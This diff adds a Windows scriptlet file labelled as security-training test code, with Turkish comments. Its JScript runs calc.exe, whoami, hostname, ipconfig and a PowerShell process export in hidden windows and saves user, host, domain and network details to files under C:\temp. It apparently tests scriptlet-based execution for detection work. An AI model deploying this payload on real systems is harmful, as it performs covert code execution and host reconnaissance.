@@ -1,0 +1,44 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="TestScript"
+    classid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"
+    description="Test Scriptlet for Security Training"
+    version="1.0"
+    remotable="true">
+</registration>
+<script language="JScript">
+<![CDATA[
+    try {
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        
+        // Test işlemleri
+        shell.Run("calc.exe", 0, false);
+        
+        // Sistem bilgisi toplama
+        shell.Run("cmd.exe /c whoami > C:\\temp\\user_info.txt", 0, true);
+        shell.Run("cmd.exe /c hostname > C:\\temp\\hostname.txt", 0, true);
+        shell.Run("cmd.exe /c ipconfig > C:\\temp\\network_info.txt", 0, true);
+        
+        // Test dosyası oluşturma
+        var file = fso.CreateTextFile("C:\\temp\\sct_execution_test.txt", true);
+        file.WriteLine("SCT Execution Test - " + new Date());
+        file.WriteLine("User: " + shell.ExpandEnvironmentStrings("%USERNAME%"));
+        file.WriteLine("Computer: " + shell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
+        file.WriteLine("Domain: " + shell.ExpandEnvironmentStrings("%USERDOMAIN%"));
+        file.Close();
+        
+        // PowerShell komut çalıştırma
+        shell.Run("powershell.exe -Command \"Get-Process | Export-Csv C:\\temp\\processes.csv\"", 0, true);
+        
+    } catch(e) {
+        // Hata durumunda log
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var errorFile = fso.CreateTextFile("C:\\temp\\sct_error.txt", true);
+        errorFile.WriteLine("Error: " + e.message);
+        errorFile.Close();
+    }
+]]>
+</script>
+</scriptlet>
